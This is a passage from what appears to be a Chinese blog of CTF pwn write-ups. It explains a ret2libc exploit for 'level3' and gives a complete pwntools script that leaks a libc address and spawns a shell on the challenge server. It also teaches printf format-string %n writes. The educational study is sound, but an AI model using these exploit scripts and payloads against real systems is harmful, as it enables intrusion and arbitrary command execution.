<p>同理<code>elf.got['write']</code>这个东西是write在got表中的首地址,打印一下结果为<code>0x804a018</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A018 off_804A018     dd offset write         ; DATA XREF: _write↑r</span><br></pre></td></tr></table></figure>
<p>因此这里这条exp语句可以这样写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(<span class="number">0x8048340</span>)+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x804a018</span>)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>这是只用ida,不借助python的pwn包可以做到的</p>
</blockquote>
<blockquote>
<p>为什么要将返回地址溢出改成write在plt中的位置?直接溢出成write的位置行吗?</p>
<p>write也是动态库函数,这里只是调用它,动态库中的函数都是查plt表调用的</p>
<p>如果这直接溢出成write的地址,那我们得事先直到它加载后在进程虚拟地址空间中的地址,</p>
<p>而我们现在就是想要再调用它打印自己的地址</p>
<p>如果事先知道,现在求个寂寞啊</p>
</blockquote>
<p>然后<code>0000</code>是为了填充返回地址到<code>main</code>栈帧之间四个无用字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+00000004  r              db 4 dup(?)		//返回地址</span><br><span class="line">+00000008			//无用字节</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为啥要溢出这四个字节?直接写write的参数不行吗?</p>
<p>这四个字节属于vulernable_func的栈帧,在跳转write之前是会被清理掉的</p>
</blockquote>
<p>然后<code>p32(1)+p32(elf.got['write'])+p32(4)</code>三个四字节在栈顶作为write的三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(fd,str,size);		//(文件描述符,字符串,大小)</span><br><span class="line">write(标准输出1,got表中存放的write的地址,4个字节,正好32位表示一个地址);</span><br></pre></td></tr></table></figure>
<p>此步执行之后程序将write在got表中的地址打印出来</p>
<blockquote>
<p>这就相当于我们已经跟踪这个学生到达了058班的考场,下一步就是根据该学生的学号和sjf的学号差,寻找sjf的位置</p>
</blockquote>
<p>考虑此步执行之后程序的行为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里涉及到一个call function和jmp function的区别</p>
<p>使用call指令调用一个函数时,首先将PC即返回地址压栈,然后<code>jmp function</code></p>
<p>即两者的区别在于控制转移到function之前有没有将PC放在栈顶</p>
<p>我们现在将<code>p32(elf.plt['write'])</code>放在<code>vulnerable</code>的返回地址位置,</p>
<p>返回实际上就相当于一个jmp,</p>
<p>即我们执行了一个<code>jmp write</code>,没有使用call</p>
<p>理论上调用函数都要使用call,在跳转前将PC放在栈顶</p>
<p>现在我们没有将PC放在栈顶直接跳转到write,但是write函数它不知道啊,他认为我们溢出放置的<code>0000</code>就是返回地址,<strong>根据<code>_cdecl</code>约定</strong>,write将会自己清理自己的堆栈,那么在write返回的时候就会将0000放在rip中,程序接下来从0000开始执行,谁知道这是什么鬼地方,能不能执行也不好说</p>
<p>但是既然我们已经分析出0000将会被执行,那我们把他换成main函数的地址,不也可以执行吗?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(main_addr)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>下面我们就将会用到这种性质</p>
</blockquote>
<p>前面我们已经通过栈缓冲区溢出获得了<code>write</code>的地址,下面我们还需要再溢出一次来跳转到<code>system</code>函数,这就用到了刚才我们分析的性质</p>
<p>我们在刚才执行了<code>write</code>之后将控制转移到<code>main</code>的开始地址,则程序又从头执行一遍,这次我们又有一个干净利索的<code>vulnerable_func</code>栈</p>
<p>本次缓冲区溢出时,首先还是填充<code>0x8c</code>个字符,然后将<code>system</code>函数的地址放到返回地址位置,然后4个无用字节用<code>0000</code>填充,然后写"<code>/bin/sh</code>"的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(write_addr-<span class="number">0x99a80</span>)+<span class="string">b&#x27;0000&#x27;</span>+p32(write_addr-<span class="number">0x11e6eb</span>)</span><br></pre></td></tr></table></figure>
<p>system执行完毕之后返回地址为刚才用0填充的4个无用字节,但是我们已经不需要<code>system</code>返回了,<code>system('/bin/sh')</code>之后我们就已经有shell了</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>write</th>
<th>system</th>
<th>/bin/sh</th>
</tr>
</thead>
<tbody>
<tr>
<td>libc中的位置</td>
<td><code>0xd43c0</code></td>
<td><code>0x3a940</code></td>
<td><code>0x15902b</code></td>
</tr>
<tr>
<td>相对于write的位置</td>
<td><code>0</code></td>
<td><code>-0x99a80</code></td>
<td><code>-0x11e6eb</code></td>
</tr>
</tbody>
</table>
<h3 id="exp-5">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;53737&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">system_offset=libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#system函数相对于libc基地址的偏移量</span></span><br><span class="line"></span><br><span class="line">shell_offset=<span class="number">0x15902b</span><span class="comment">#/bin/sh相对于libc基地址的偏移量</span></span><br><span class="line"></span><br><span class="line">write_offset=libc.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#write相对于libc基地址的偏移量</span></span><br><span class="line"></span><br><span class="line">libc_start=write_addr-write_offset<span class="comment">#libc库的运行时基地址</span></span><br><span class="line"></span><br><span class="line">system_addr=libc_start+system_offset<span class="comment">#system运行时地址</span></span><br><span class="line"></span><br><span class="line">shell_addr=libc_start+shell_offset<span class="comment">#/bin/sh的运行时地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(system_addr)+<span class="string">b&#x27;0000&#x27;</span>+p32(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">\xc0o\xf7Input:</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level3</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;93ceadf23838a0fd793719d215b9876e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="get_shell白给">007get_shell(白给)</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/get_shell]</span><br><span class="line">└─# ./get_shell</span><br><span class="line">OK,this time we will get a shell.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">get_shell  Ponce.cfg</span><br></pre></td></tr></table></figure>
<p>运行即可得到shell</p>
<p>为啥还是7分的题?</p>
<h2
id="cgfsbprintf格式化字符串漏洞">008CGfsb(printf格式化字符串漏洞)</h2>
<p>printf格式化字符串漏洞,总之就是特别绕</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn\CGfsb&gt; checksec cgfsb</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\CGfsb\\cgfsb&#x27;</span></span><br><span class="line">    Arch:     i386<span class="literal">-32-little</span></span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found					;金丝雀保护,栈溢出困难</span><br><span class="line">    NX:       NX enabled					</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="信息收集">信息收集:</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/CGfsb]</span><br><span class="line">└─$ ./cgfsb</span><br><span class="line">please tell me your name:</span><br><span class="line">123</span><br><span class="line">leave your message please:</span><br><span class="line">456</span><br><span class="line">hello 123</span><br><span class="line">your message is:</span><br><span class="line">456</span><br><span class="line">Thank you!</span><br></pre></td></tr></table></figure>
<h3 id="反汇编分析-2">反汇编分析</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">;开端</span><br><span class="line">.text:080485CD                 push    ebp</span><br><span class="line">.text:080485CE                 mov     ebp, esp</span><br><span class="line">.text:080485D0                 push    edi</span><br><span class="line">.text:080485D1                 push    esi</span><br><span class="line">.text:080485D2                 push    ebx</span><br><span class="line">.text:080485D3                 and     esp, 0FFFFFFF0h ; esp寄存器低4位归零</span><br><span class="line">.text:080485D6                 sub     esp, 90h</span><br><span class="line">.text:080485DC                 mov     eax, large gs:14h</span><br><span class="line">.text:080485E2                 mov     [esp+9Ch+anonymous_1], eax</span><br><span class="line"></span><br><span class="line">; 设置标准输入,标准输出,标准错误的缓冲区大小为0</span><br><span class="line">.text:080485E9                 xor     eax, eax</span><br><span class="line">.text:080485EB                 mov     eax, ds:stdin@@GLIBC_2_0 </span><br><span class="line">.text:080485F0                 mov     [esp+9Ch+var_98], 0 ; buf</span><br><span class="line">.text:080485F8                 mov     [esp+9Ch+stream], eax ; stream</span><br><span class="line">.text:080485FB                 call    _setbuf</span><br><span class="line">.text:08048600                 mov     eax, ds:stdout@@GLIBC_2_0</span><br><span class="line">.text:08048605                 mov     [esp+9Ch+var_98], 0 ; buf</span><br><span class="line">.text:0804860D                 mov     [esp+9Ch+stream], eax ; stream</span><br><span class="line">.text:08048610                 call    _setbuf</span><br><span class="line">.text:08048615                 mov     eax, ds:stderr@@GLIBC_2_0</span><br><span class="line">.text:0804861A                 mov     [esp+9Ch+var_98], 0 ; buf</span><br><span class="line">.text:08048622                 mov     [esp+9Ch+stream], eax ; stream</span><br><span class="line">.text:08048625                 call    _setbuf</span><br><span class="line"></span><br><span class="line">;各变量,缓冲区初始化</span><br><span class="line">.text:0804862A                 mov     [esp+9Ch+buf], 0</span><br><span class="line">.text:08048632                 mov     [esp+9Ch+var_7A], 0</span><br><span class="line">.text:0804863A                 mov     [esp+9Ch+anonymous_0], 0</span><br><span class="line">.text:08048641                 lea     ebx, [esp+9Ch+s]</span><br><span class="line">.text:08048645                 mov     eax, 0          ; eax将会被拷贝到串中的各个字符</span><br><span class="line">.text:0804864A                 mov     edx, 19h        ; 重复次数19h=25次,每次</span><br><span class="line">.text:0804864F                 mov     edi, ebx</span><br><span class="line">.text:08048651                 mov     ecx, edx</span><br><span class="line">.text:08048653                 rep stosd               ; s串置零</span><br><span class="line"></span><br><span class="line">;打印第一句废话</span><br><span class="line">.text:08048655                 mov     [esp+9Ch+stream], offset s ; &quot;please tell me your name:&quot;</span><br><span class="line">.text:0804865C                 call    _puts</span><br><span class="line"></span><br><span class="line">;获取第一句输入</span><br><span class="line">.text:08048661                 mov     [esp+9Ch+nbytes], 0Ah ; nbytes</span><br><span class="line">.text:08048669                 lea     eax, [esp+9Ch+buf]</span><br><span class="line">.text:0804866D                 mov     [esp+9Ch+var_98], eax ; buf</span><br><span class="line">.text:08048671                 mov     [esp+9Ch+stream], 0 ; fd</span><br><span class="line">.text:08048678                 call    _read                            ;从标准输入至多获得A=10字节的输入作为名字</span><br><span class="line"></span><br><span class="line">;打印第二句废话</span><br><span class="line">.text:0804867D                 mov     [esp+9Ch+stream], offset aLeaveYourMessa ; &quot;leave your message please:&quot;</span><br><span class="line">.text:08048684                 call    _puts</span><br><span class="line"></span><br><span class="line">;获取第二句输入</span><br><span class="line">.text:08048689                 mov     eax, ds:stdin@@GLIBC_2_0</span><br><span class="line">.text:0804868E                 mov     [esp+9Ch+nbytes], eax ; stream           ;标准输入魔数0-&gt;eax-&gt;nbytes,实际上参数名字与其用处不相符了</span><br><span class="line">.text:08048692                 mov     [esp+9Ch+var_98], 64h ; n          ; 从标注输入至多获取64h=100字节的输入放到s,恰好和s的大小相同</span><br><span class="line">.text:0804869A                 lea     eax, [esp+9Ch+s]</span><br><span class="line">.text:0804869E                 mov     [esp+9Ch+stream], eax ; s</span><br><span class="line">.text:080486A1                 call    _fgets                               ;从标注输入获取至多64h=100字节的输入作为信息message,放在s串</span><br><span class="line"></span><br><span class="line">;打印刚才获取到的信息和新的废话</span><br><span class="line">.text:080486A6                 lea     eax, [esp+9Ch+buf]</span><br><span class="line">.text:080486AA                 mov     [esp+9Ch+var_98], eax</span><br><span class="line">.text:080486AE                 mov     [esp+9Ch+stream], offset format ; &quot;hello %s&quot;</span><br><span class="line">.text:080486B5                 call    _printf</span><br><span class="line">.text:080486BA                 mov     [esp+9Ch+stream], offset aYourMessageIs ; &quot;your message is:&quot;</span><br><span class="line">.text:080486C1                 call    _puts</span><br><span class="line"></span><br><span class="line">;关键</span><br><span class="line">.text:080486C6                 lea     eax, [esp+9Ch+s]</span><br><span class="line">.text:080486CA                 mov     [esp+9Ch+stream], eax ; format</span><br><span class="line">.text:080486CD                 call    _printf								;蜜汁操作,printf只有一个参数</span><br><span class="line"></span><br><span class="line">;关键</span><br><span class="line">.text:080486D2                 mov     eax, ds:pwnme</span><br><span class="line">.text:080486D7                 cmp     eax, 8          ; 当ds:pwnme被修改为8时获得flag</span><br><span class="line">.text:080486DA                 jnz     short loc_80486F6</span><br><span class="line">.text:080486DC                 mov     [esp+9Ch+stream], offset aYouPwnedMeHere ; &quot;you pwned me, here is your flag:\n&quot;</span><br><span class="line">.text:080486E3                 call    _puts</span><br><span class="line">.text:080486E8                 mov     [esp+9Ch+stream], offset command ; &quot;cat flag&quot;</span><br><span class="line">.text:080486EF                 call    _system</span><br><span class="line">.text:080486F4                 jmp     short loc_8048702</span><br></pre></td></tr></table></figure>
<p>双击<code>ds:pwnme</code>观察其上下文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.bss:0804A064 completed_6591  db ?                    ; DATA XREF: __do_global_dtors_aux↑r</span><br><span class="line">.bss:0804A064                                         ; __do_global_dtors_aux+14↑w</span><br><span class="line">.bss:0804A065                 align 4</span><br><span class="line"></span><br><span class="line">.bss:0804A068                 public pwnme</span><br><span class="line">.bss:0804A068 pwnme           dd ?                    ; DATA XREF: main+105↑r</span><br><span class="line">.bss:0804A068 _bss            ends					;这里可以获取到的有效信息是pwnme的地址0x0804A068</span><br><span class="line">.bss:0804A068</span><br><span class="line">.prgend:0804A06C ; ===========================================================================</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="格式化字符串漏洞套路printf">格式化字符串漏洞套路printf</h3>
<p>以下逐步尝试使用格式化字符串漏洞修改<strong>栈上</strong>的变量值,看看printf是如何沦陷的</p>
<p>首先栈上有一个<code>int a</code>,有一个<code>char s[120]</code>,要想通过格式化字符串漏洞修改一个变量的值,需要知道他在栈上什么位置</p>
<p>谁更靠近栈顶光是通过看源代码是看不出来的,有可能有各种编译优化,通过下面程序观察</p>
<p><code>mytest.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">20</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">120</span>]=<span class="string">&quot;%p-%p-%p-%p&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n%p\n&quot;</span>,&amp;a,&amp;s);<span class="comment">//观察a和s在栈中的位置</span></span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里后面的<code>printf(s)</code>没有管s中如何格式化的,没有管s中指定了多少个参数,</p>
<p>如果s中指定了n个%p格式的参数,则printf会从栈顶开始向栈底方向依次取出n个32位数(恰好是一个双字),每一个对应一个%p</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/CGfsb]</span><br><span class="line">└─# gcc mytest.c -Og -m32 -o mytest		<span class="comment">#-m32编译成32位程序,栈上32位对齐</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/CGfsb]</span><br><span class="line">└─# ./mytest</span><br><span class="line">0xffaf269c</span><br><span class="line">0xffaf2624</span><br><span class="line">0xffaf269c-0xffaf2624-0xf63d4e2e-0x5655b2b2</span><br></pre></td></tr></table></figure>
<p>说明<code>int a</code>在栈顶,然后紧接着是<code>char s[120]</code>的首地址</p>
<p>那么printf(s)会错误地把a作为第一个参数,栈上存储的是a的地址,使用<code>%1$n</code>即可将格式化字符串s之前的字符数输入栈上第一个参数(期望是一个地址)</p>
<blockquote>
<p>啥意思呢?<code>%x$n</code>即将其之前的字符数输出到格式化字符串指定的第x个地址(即使栈上存放的不是地址也要作为地址,但此时很有可能引发段错误)</p>
<p>这句话非常绕口,还是以先前的程序为例子</p>
<p>在这个例子中,通过先前的打印已经知道<code>printf(s)</code>时栈顶是<code>a</code>的地址,如果s串中没有<code>%p,%x</code>等等这样的占位符,即如果s为纯字符串则<code>printf</code>只会打印该字符串,然后什么都不会发生</p>
<p>如果s中有一个<code>%p</code>即指定了一个<strong>格式化参数</strong>,但是在调用<code>printf(s)</code>时并没有写成<code>printf(s,a)</code>这样指定这个参数,那么<code>printf</code>会自动将当前栈顶作为参数进行打印,于是就发生了信息泄漏</p>
<blockquote>
<p>使用%p这种格式的作用是,正好取栈上一个对齐单元32位4字节,</p>
<p>如果用%s则将参数作为字符串,一直打印直到'\0'</p>
</blockquote>
<p>同理如果s中有两个<code>%p</code>即指定了两个<strong>格式化参数</strong>,则先后从栈顶向栈底方向取两个双字,以16进制形式打印</p>
<p><code>%x$n</code>的作用是,将%号之前格式化字符串中的字符数,输出到第n个<strong>格式化参数</strong>指向的内存地址,即将从栈顶向栈底数的第n个双字,作为一个32位地址,然后输出到该地址,</p>
<blockquote>
<p>实际上这个双字也可能不是一个地址,这时大概率引发段错误</p>
</blockquote>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">20</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">120</span>]=<span class="string">&quot;%p-%p-%p-%p&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n%p\n&quot;</span>,&amp;a,&amp;s);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%1$n&quot;</span>);						<span class="comment">//%1$n之前没有字符,因此0会被输出到栈上第一个</span></span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,a);				</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的编译命令,运行结果为:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/CGfsb]</span><br><span class="line">└─# ./mytest</span><br><span class="line">0xffee562c</span><br><span class="line">0xffee55b4</span><br><span class="line">0xffee562c-0xffee55b4-0xf63d4e2e-0x565632b2</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>a的地址,<code>0xffee562c</code>被printf默认当作第一个格式化参数,然后将<code>%1$n</code>之前的0个字符输出到该地址,因此a原来的值20就被改变了</p>
</blockquote>
<h3 id="回到本题">回到本题</h3>
<p>从刚才的实验中我们可以知道</p>
<p>如果想要通过printf格式化字符串漏洞改变一个变量的值,需要先了解</p>
<p>1.变量的地址</p>
<p>2.如果将变量的地址写成一个32位数然后压栈,在打印的时候是第几个双字,这用于确定<code>%x$n</code>中的x</p>
<p>3.%x$n之前的字符数决定了把第x个格式化参数指向的变量修改成多少</p>
<p>本题中</p>
<p>可以通过ida得出pwnme的地址<code>0x0804A068</code></p>
<p>下面尝试观察格式化字符串的第一个双字是printf的第几个格式化双字参数</p>
<blockquote>
<p>这句话说地又跟放屁似的,啥意思呢?</p>
<p>比如构造一个格式化字符串<code>s="AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"</code></p>
<p>作用是判断第一个双字(这里用<code>0x41414141</code>AAAA占位),是栈上第几个双字,以此决定<code>%x$n</code>中的x</p>
<p>这里s也会被四个字符一组作为一个双字压栈,那么前四个字符AAAA必然作为一个双字压栈,</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">your message is:</span><br><span class="line">AAAA-0xffebcaee-0xf7f6c580-0xffebcb4c-0xf7fb4b30-0x1-0xf7f7a420-0x32310001-0xa33-(nil)-0x41414141-0x2d70252d-0x252d7025</span><br><span class="line">Thank you!</span><br></pre></td></tr></table></figure>
<p>整体要按照s给出的格式打印,s自己也会作为一个普通的字符串存储在栈上</p>
<p>这里第10个格式化参数对应的<code>0x41414141</code>即为s中前四个字符存储在栈上的一个双字,显然这不是一个地址</p>
<blockquote>
<p>第一个格式化参数对应的是<code>0xffebcaee</code>这是一个地址,</p>
<p>再往前的四个A不是格式化参数,是s中的常量</p>
</blockquote>
<p>后面第11个格式化参数对应<code>0x2d70252d</code>对应ascii码<code>-p%-</code></p>
<p>可想而知,s无论我们继续写多长,第10个参数总是<code>0x41414141</code>,因为s作为普通的字符串放在栈上距离栈顶较远的地方</p>
<p>现在将s的头四个A换成<code>p32(0x0804A068)</code>,即将pwnme的地址写成一个双字作为s的头四个字符(非可打印字符)</p>
<p>那么可想而知此时第10个格式化参数就得对应<code>0x0804A068</code></p>
<p>就差最后一步了,向该地址上写个8</p>
<p>我们已经在最开始写了一个<code>p32(0x0804A068)</code>相当于4个字符,还需要写入4个字符,随便整四个就可以比如'1234',然后就是<code>%10$n</code></p>
<p>如此可以写出exp</p>
<h3 id="exp-6">exp</h3>
